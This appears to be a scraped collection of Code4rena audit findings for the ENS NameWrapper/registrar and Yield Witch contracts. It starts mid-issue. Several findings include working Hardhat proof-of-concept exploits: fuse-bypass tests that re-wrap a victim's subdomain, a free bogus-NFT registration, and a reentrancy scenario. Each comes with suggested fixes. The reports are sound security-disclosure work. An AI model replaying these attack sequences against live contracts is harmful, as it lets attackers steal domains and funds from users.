`PARENT_CANNOT_CONTROL` fuse is burnt (and does not expire), its parent should not be able to burn its fuses or change its owner.  However, this contraint can be bypassed by a parent node maliciously unwrapping itself. As long as the hacker becomes the ENS owner of the parent node, he can leverage `ENSRegistry::setSubnodeOwner` to re-set himself as the ENS owner of the subdomain, and thus re-invoking `NameWrapper.wrap` can rewrite the fuses and wrapper owner of the given subdoamin.   Considering the following attack scenario:  + Someone owns a domain (or a 2LD), e.g., _poc.eth_ + The domain owner assigns a sub-domain to the hacker, e.g., _hack.poc.eth_      + This sub-domain should not burn `CANNOT_UNWRAP`      + This sub-domain can burn `PARENT_CANNOT_CONTROL` + Hacker assigns a sub-sub-domain to a victim user, e.g., _victim.hack.poc.eth_ + The victim user burns arbitrary fuses, including `PARENT_CANNOT_CONTROL`      + The hacker should not be able to change the owner and the fuses of `victim.hack.poc.eth` ideally + However, the hacker then unwraps his sub-domain, i.e., _hack.poc.eth_ + The hacker invokes `ENSRegistry::setSubnodeOwner(hacker.poc.eth, victim)` on the sub-sub-domain      + He can reassign himself as the owner of the _victim.hack.poc.eth_ + The hacker invokes `NameWrapper.wrap(victim.hacker.poc.eth)` to over-write the fuses and owner of the sub-sub-domain, i.e., _victim.hacker.poc.eth_  The root cause here is that, for any node, when one of its subdomains burns `PARENT_CANNOT_CONTROL`, the node itself fails to burn `CANNOT_UNWRAP`. Theoretically, this should check to the root, which however is very gas-consuming.   ### Notes  Discussed with the project member, Jeff Lau.   If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.   ### Suggested Fix  + Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped. + Potential fix 2: leave fuses as is when unwrapping and re-wrapping, unless name expires. Meanwhile, check the old fuses even wrapping.   ### PoC / Attack Scenario  There are two attached PoC files, `poc1.js` and `poc2.js`. The `poc1.js` is for a case where the hacker holds a 2LD, and the `poc2.js` demonstrates the aforementioned scenario.  To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.   #### poc1.js ```javascript const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const namehash = n.hash const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 1', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('subdomain can be re-wrapped', () => {     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'register'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // register a 2LD domain for the hacker       await NameWrapper.registerAndWrapETH2LD(         label,         hacker,         86400,         EMPTY_ADDRESS,         CAN_DO_EVERYTHING,         MAX_EXPIRY       )       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)        // hacker signed a submomain for a victim user       const subLabel = 'hack'       const subLabelHash = labelhash(subLabel)       const wrappedSubTokenId = namehash(subLabel + '.' + label + '.eth')       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         subLabel,         victim,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(victim)       expect(           (await NameWrapper.getFuses(wrappedSubTokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL)        // the user sets a very strict fuse for the wrappedSubTokenId       await NameWrapperV.setFuses(wrappedSubTokenId, 127 - PARENT_CANNOT_CONTROL) // 63       expect((await NameWrapper.getFuses(wrappedSubTokenId))[0]).to.equal(127)        // the hacker unwraps his 2LD token       await NameWrapperH.unwrapETH2LD(labelHash, hacker, hacker)       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(hacker)       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(hacker)        // the hacker setSubnodeOwner       await EnsRegistryH.setSubnodeOwner(wrappedTokenId, subLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)        // the hacker re-wrap the sub node       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)       await NameWrapperH.wrap(           encodeName(subLabel + '.' + label + '.eth'),           hacker,           EMPTY_ADDRESS       )        ///////////////////////////       // Attack successed!       ///////////////////////////        // XXX: [1] the owner of wrappedSubTokenId transfer from the victim to the hacker       // XXX: [2] the fuses of wrappedSubTokenId becomes 0 from full-protected       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)       expect((await NameWrapper.getFuses(wrappedSubTokenId))[0]).to.equal(0)     })   }) }) ```  #### poc2.js ```javascript const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const namehash = n.hash const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 2', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('subdomain can be re-wrapped', () => {     /*      * Attack scenario:      *  + Someone owns a domain (or a 2LD), e.g., poc.eth      *  + The domain owner assigns a sub-domain to the hacker, e.g., hack.poc.eth      *      + This sub-domain should not burn `CANNOT_UNWRAP`      *      + This sub-domain can burn `PARENT_CANNOT_CONTROL`      *  + Hacker assigns a sub-sub-domain to a victim user, e.g., victim.hack.poc.eth      *  + The victim user burns arbitrary fuses, including `PARENT_CANNOT_CONTROL`      *  + The hacker unwraps his sub-domain, i.e., hack.poc.eth      *  + The hacker invokes `ENSRegistry::setSubnodeOwner` on the sub-sub-domain      *      + He can reassign himself as the owner of the victim.hack.poc.eth      *  + The sub-sub-domain is now owned by the hacker with more permissive fuses      */     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'poc'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // register a 2LD domain       await NameWrapper.registerAndWrapETH2LD(         label,         dev,         86400,         EMPTY_ADDRESS,         CAN_DO_EVERYTHING,         MAX_EXPIRY       )       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(dev)        // signed a submomain for the hacker       const subLabel = 'hack'       const subLabelHash = labelhash(subLabel)       const subDomain = subLabel + '.' + label + '.eth'       const wrappedSubTokenId = namehash(subDomain)       await NameWrapper.setSubnodeOwner(         wrappedTokenId,         subLabel,         hacker,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSubTokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL)        // hacker signed a subsubmomain for a victim user       const subSubLabel = 'victim'       const subSubLabelHash = labelhash(subSubLabel)       const subSubDomain = subSubLabel + '.' + subDomain       const wrappedSubSubTokenId = namehash(subSubDomain)       await NameWrapperH.setSubnodeOwner(         wrappedSubTokenId,         subSubLabel,         victim,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(victim)       expect(           (await NameWrapper.getFuses(wrappedSubSubTokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL)        // the user sets a very strict fuse for the wrappedSubSubTokenId       await NameWrapperV.setFuses(wrappedSubSubTokenId, 127 - PARENT_CANNOT_CONTROL) // 63       expect((await NameWrapper.getFuses(wrappedSubSubTokenId))[0]).to.equal(127)        // the hacker unwraps his wrappedSubTokenId       await NameWrapperH.unwrap(wrappedTokenId, subLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)        // the hacker setSubnodeOwner, to set the owner of wrappedSubSubTokenId as himself       await EnsRegistryH.setSubnodeOwner(wrappedSubTokenId, subSubLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(hacker)          // the hacker re-wrap the sub sub node       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)       await NameWrapperH.wrap(encodeName(subSubDomain), hacker, EMPTY_ADDRESS)        // ///////////////////////////       // // Attack successed!       // ///////////////////////////        // XXX: [1] the owner of wrappedSubTokenId transfer from the victim to the hacker       // XXX: [2] the fuses of wrappedSubTokenId becomes 0 from full-protected       expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(hacker)       expect((await NameWrapper.getFuses(wrappedSubSubTokenId))[0]).to.equal(0)     })   }) }) ```  "}, {"title": "The `unwrapETH2LD` use `transferFrom` instead of `safeTransferFrom` to transfer ERC721 token", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/157", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "sponsor disputed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L327-L346   # Vulnerability details  ### Impact  The `unwrapETH2LD` use `transferFrom` to transfer ERC721 token, the `newRegistrant` could be an unprepared contract  ### Proof of Concept  Should a ERC-721 compatible token be transferred to an unprepared contract, it would end up being locked up there. Moreover, if a contract explicitly wanted to reject ERC-721 safeTransfers. Plus take a look to [the OZ safeTransfer comments](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#IERC721-transferFrom-address-address-uint256-);   `Usage of this method is discouraged, use safeTransferFrom whenever possible.`  ### Tools Used  Manual Review  ### Recommended Mitigation Steps  ```diff     function unwrapETH2LD(         bytes32 labelhash,         address newRegistrant,         address newController     ) public override onlyTokenOwner(_makeNode(ETH_NODE, labelhash)) {         _unwrap(_makeNode(ETH_NODE, labelhash), newController); -       registrar.transferFrom( +       registrar.safeTransferFrom(             address(this),             newRegistrant,             uint256(labelhash)         );     } ```  "}, {"title": "transfer() depends on gas consts", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/133", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L183-L185 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L204   # Vulnerability details  ## Impact `transfer()` forwards 2300 gas only, which may not be enough in future if the recipient is a contract and gas costs change. it could break existing contracts functionality.  ## Proof of Concept `.transfer` or `.send` method, only 2300 gas will be \u201cforwarded\u201d to fallback function. Specifically, the SLOAD instruction, will go from costing 200 gas to 800 gas.  if any smart contract has a functionality of register ens and it has fallback function which is making some state change in contract on ether receive, it could use more than 2300 gas and revert every transaction  for reference checkout this, https://docs.soliditylang.org/en/v0.8.15/security-considerations.html?highlight=transfer#sending-and-receiving-ether https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps  use `.call` insted `.transfer`       (bool success, ) = msg.sender.call.value(amount)(\"\");      require(success, \"Transfer failed.\");   "}, {"title": "Users can create extra ENS records at no cost", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/132", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L249-L268 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L125 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/BaseRegistrarImplementation.sol#L106   # Vulnerability details  ## Impact Users using the ```register``` function in ```ETHRegistrarController.sol```, can create an additional bogus ENS entry (Keep the ERC721 and all the glory for as long as they want) for free by exploiting the ```functionCall``` in the ```_setRecords``` function. The only check there (in the setRecord function) is that the nodehash matches the originally registered ENS entry, this is extremely dangerous because the rest of the functionCall is not checked and the controller has very elevated privileges in ENS ecosystem (and probably beyond).  The single exploit I am showing is already very bad, but I expect there will be more if this is left in. An example of a potential hack is that some of the functions in other ENS contracts (which give the RegistrarController elevated privilege) have dynamic types as the first variables--if users can generate a hash that is a low enough number, they will be able to unlock more exploits in the ENS ecosystem because of how dynamic types are abi encoded.  Other developers will probably also trust the ```ETHRegistrarController.sol```, so other unknown dangers may come down the road.  The exploit I made (full code in PoC) can mint another ENS entry and keep it for as long as it wants, without paying more--will show code below.  ## Proof of Concept Put this code in the ```TestEthRegistrarController.js``` test suite to run. I just appended this to tests at the bottom of file.   I called the ```BaseRegistrarImplementation.register``` function with the privileges of ```ETHRegistrarController``` by passing the base registrar's address as the ```resolver``` param in the ```ETHRegistrarController.register``` function call. I was able to set a custom duration at no additional cost.   The final checks of the PoC show that we own two new ENS entries from a single ```ETHRegistrarController.register``` call. The labelhash of the new bogus ENS entry is the nodehash of the first registered ENS entry.  ```js   it('Should allow us to make bogus erc721 token in ENS contract', async () => {     const label = 'newconfigname'     const name = `${label}.eth`     const node = namehash.hash(name)     const secondTokenDuration = 788400000 // keep bogus NFT for 25 years;      var commitment = await controller.makeCommitment(       label,       registrantAccount,       REGISTRATION_TIME,       secret,       baseRegistrar.address,       [         baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [           node,           registrantAccount,           secondTokenDuration         ]),       ],       false,       0,       0     )     var tx = await controller.commit(commitment)     expect(await controller.commitments(commitment)).to.equal(       (await web3.eth.getBlock(tx.blockNumber)).timestamp     )      await evm.advanceTime((await controller.minCommitmentAge()).toNumber())     var balanceBefore = await web3.eth.getBalance(controller.address)      let tx2 = await controller.register(       label,       registrantAccount,       REGISTRATION_TIME,       secret,       baseRegistrar.address,       [         baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [           node,           registrantAccount,           secondTokenDuration         ]),       ],       false,       0,       0,       { value: BUFFERED_REGISTRATION_COST }     )      expect(await nameWrapper.ownerOf(node)).to.equal(registrantAccount)     expect(await ens.owner(namehash.hash(name))).to.equal(nameWrapper.address)       expect(await baseRegistrar.ownerOf(node)).to.equal( // this checks that bogus NFT is owned by us       registrantAccount     )     expect(await baseRegistrar.ownerOf(sha3(label))).to.equal(       nameWrapper.address     )   }) ```  ## Tools Used chai tests in repo  ## Recommended Mitigation Steps I recommend being stricter on the signatures of the user-provided ```resolver``` and the function that is being called (like safeTransfer calls in existing token contracts). An example of how to do this is by creating an interface that ENS can publish for users that want to compose their own resolvers and call that instead of a loose functionCall. Users will be free to handle data however they like, while restricting the space of things that can go wrong.  I will provide a loose example here: ``` interface IUserResolver {     function registerRecords(bytes32 nodeId, bytes32 labelHash, bytes calldata extraData)  } ```  "}, {"title": "It is possible to create fake ERC1155 NameWrapper token for subdomain, which is not owned by NameWrapper", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/84", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L820-L821 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L524 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L572   # Vulnerability details  ## Impact  Due to re-entrancy possibility in `NameWrapper._transferAndBurnFuses` (called from `setSubnodeOwner` and `setSubnodeRecord`), it is possible to do some stuff in `onERC1155Received` right after transfer but before new owner and new fuses are set. This makes it possible, for example, to unwrap the subdomain, but owner and fuses will still be set even for unwrapped domain, creating fake `ERC1155` `NameWrapper` token for domain, which is not owned by `NameWrapper`.  Fake token creation scenario:  1. `Account1` registers and wraps `test.eth` domain 2. `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` subdomain with `Account1` as owner (to make NameWrapper owner of subdomain) 3. `Contract1` smart contract is created, which calls unwrap in its `onERC1155Received` function, and a function to send `sub.test.eth` ERC1155 NameWrapper token back to `Account1` 4. `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` with `Contract1` as new owner, which unwraps domain back to `Account1` but due to re-entrancy, NameWrapper sets fuses and ownership to `Contract1` 5. `Account1` calls function to send ERC1155 token from `Contract1` back to self.  After this sequence of events, `sub.test.eth` subdomain is owned by `Account1` both in `ENS` registry and in `NameWrapper` (with fuses and expiry correctly set to the future date). Lots (but not all) of functions in `NameWrapper` will fail to execute for this subdomain, because they expect `NameWrapper` to have ownership of the domain in `ENS`, but some functions will still work, making it possible to make the impression of good domain.  At this point, ownership in `NameWrapper` is \"detached\" from ownership in `ENS` and `Account1` can do all kinds of malcious stuff with its ERC1155 token. For example:  1. Sell subdomain to the other user, transfering `ERC1155` to that user and burning `PARENT_CANNOT_CONTROL` to create impression that he can't control the domain. After receiving the payment, `Account1` can wrap the domain again, which burns existing ownership record and replaces with the new one with clear fuses and `Account1` ownership, effectively stealing domain back from unsuspecting user, who thought that `ERC1155` gives him the right to the domain (and didn't expect that parent can clear fuses when `PARENT_CANNOT_CONTROL` is set).  2. Transfer subdomain to some other smart contract, which implements `onERC1155Received`, then take it back, fooling smart contract into believing that it has received the domain.   ## Proof of Concept  Copy these to test/wrapper and run: yarn test test/wrapper/NameWrapperReentrancy.js  https://gist.github.com/panprog/3cd94e3fbb0c52410a4c6609e55b863e   ## Recommended Mitigation Steps  Consider adding `nonReentrant` modifiers with `ReentrancyGuard` implementation from `openzeppelin`. Alternatively just fix this individual re-entrancy issue. There are multiple ways to fix it depending on expected behaviour, for example saving `ERC1155` data and requiring it to match the data after transfer (restricting `onERC1155Received` to not change any data for the token received):      function _transferAndBurnFuses(         bytes32 node,         address newOwner,         uint32 fuses,         uint64 expiry     ) internal {         (address owner, uint32 saveFuses, uint64 saveExpiry) = getData(uint256(node));         _transfer(owner, newOwner, uint256(node), 1, \"\");         uint32 curFuses;         uint64 curExpiry;         (owner, curFuses, curExpiry) = getData(uint256(node));         require(owner == newOwner && saveFuses == curFuses && saveExpiry == curExpiry);         _setFuses(node, newOwner, fuses, expiry);     }   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/174", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-yield-findings", "body": "## Wrong Comment in `SetLimit` Function  There is a wrong comment in `SetLimit` function. The comment doesn't explain the parameters used in the function. this can confuse the reader when reading the code. The comment is located below: https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L118-L122"}, {"title": "Incorrect amount of Collateral moves for Auction", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/123", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L232   # Vulnerability details  ## Impact It was observed that the debt and collateral which moves for Auction is calculated incorrectly. In case where line.proportion is set to small value, chances are art will become lower than min debt. This causes whole collateral to go for auction, which was not expected  ___  ## Proof of Concept 1. Assume line.proportion is set to 10% which is a [valid value](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L108)  2. Auction is started on Vault associated with collateral & base representing line from Step 1  3. Now debt and collateral to be sold are calculated in [_calcAuction](https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L223)  ``` uint128 art = uint256(balances.art).wmul(line.proportion).u128();         if (art < debt.min * (10**debt.dec)) art = balances.art;         uint128 ink = (art == balances.art)             ? balances.ink             : uint256(balances.ink).wmul(line.proportion).u128(); ```  4. Now lets say **debt (art)** on this vault was **amount 10**, **collateral (ink)** was **amount 9**, debt.min * (10**debt.dec) was **amount 2**  5. Below calculation occurs  ``` uint128 art = uint256(balances.art).wmul(line.proportion).u128(); // which makes art = 10*10% =1         if (art < debt.min * (10**debt.dec)) art = balances.art;   // since 1<2 so art=10         uint128 ink = (art == balances.art)                                 // Since art is 10 so ink=9             ? balances.ink             : uint256(balances.ink).wmul(line.proportion).u128(); ```  6. So full collateral and full debt are placed for Auction even though only 10% was meant for Auction. Even if it was lower than min debt, auction amount should have only increased upto the point where minimum debt limit is reached  ___  ## Recommended Mitigation Steps Revise the calculation like below  ``` uint128 art = uint256(balances.art).wmul(line.proportion).u128(); uint128 ink=0;         if (art < debt.min * (10**debt.dec))  { art = debt.min * (10**debt.dec); (balances.ink<art) ? (ink=balances.ink) : (ink=art) } else { ink=uint256(balances.ink).wmul(line.proportion).u128(); } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/119", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "# no return natspec for these functions https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L177 # typos instead of : overriden use : overridden https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L213 https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L268 instead of : specialised use : specialized https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L213 https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L268 instead of : differente use   different https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L387 instead of : quoutes use : quotes https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L522  ## no adress zero check https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L247 https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L390 ##  its best practice to remove todos from the code  https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L577 ## its best practice to remove commented code out from the contract https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L570 ## make sure external functions are comments as a part of the contract becuase there are external functions at the end of the contract after even internal functions. so as best practice make external and importent functions at the begaining of the contract then put the internal functions just to make it easier to read. https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L287 https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L253 these 2 functions are external and very importent but are in  between internal functions and the other external functions arenet which makes these functions hard to read or devs/auditors will miss these functions and think they are view or internal and not test them. ## its best practice to emit the old variable and the new variable for an importent admin function https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L84 ## make an absolute value with point function becuase if the admin is comprimsed then the attacker can set ladle to any value so instead make a require statement like ``` require(ladle<100); ``` https://github.com/code-423n4/2022-07-yield/blob/825053b1c927168b51b7a0c5d60ea0f853e19fc3/contracts/Witch.sol#L86"}, {"title": " Someone can create non-liquidatable auction if the collateral asset fails on transferring to address(0)", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/116", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-yield/blob/main/contracts/Witch.sol#L176 https://github.com/code-423n4/2022-07-yield/blob/6ab092b8c10e4dabb470918ae15c6451c861655f/contracts/Witch.sol#L399   # Vulnerability details  ## Impact might lead to systematic debt. Cause errors for liquidators to run normally.  ## Proof of Concept In the function `auction`, there is on input validation around whether the `to` is `address(0)` or not. and if the `auctioneerReward` is set to an value > 0 (as default),  each liquidate call will call `Join` module to pay out to `auctioneer` with the following line:  ```jsx if (auctioneerCut > 0) {     ilkJoin.exit(auction_.auctioneer, auctioneerCut.u128()); } ```  This line will revert if `auctioneer` is set to `address(0)` on some tokens (revert on transferring to address(0) is a [default behaviour of the OpenZeppelin template](https://www.notion.so/Yield-Witch-555e6981c26b41008d03a504077b4770)). So if someone start an `auction` with `to = address(0)`, this auction becomes un-liquidatable.  A malicious user can run a bot to monitor his own vault, and if the got underwater and they don\u2019t have enough collateral to top up, they can immediately start an auction on their own vault and set actioneer to `0` to avoid actually being liquidated, which breaks the design of the system.   ## Recommended Mitigation Steps  Add check while starting an auction:  ```jsx function auction(bytes12 vaultId, address to)     external     returns (DataTypes.Auction memory auction_) {     require (to != address(0), \"invalid auctioneer\");   ... }   ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-yield-findings/issues/111", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-yield-findings", "body": "## Summary Alberto asked [on Twitter](https://twitter.com/alcueca/status/1547548084594515970) whether the Yield team succeeded in making their contracts as easily auditable as possible. I think so. I appreciated the sequence diagrams and design decisions in the audit README, the general protocol docs, and the 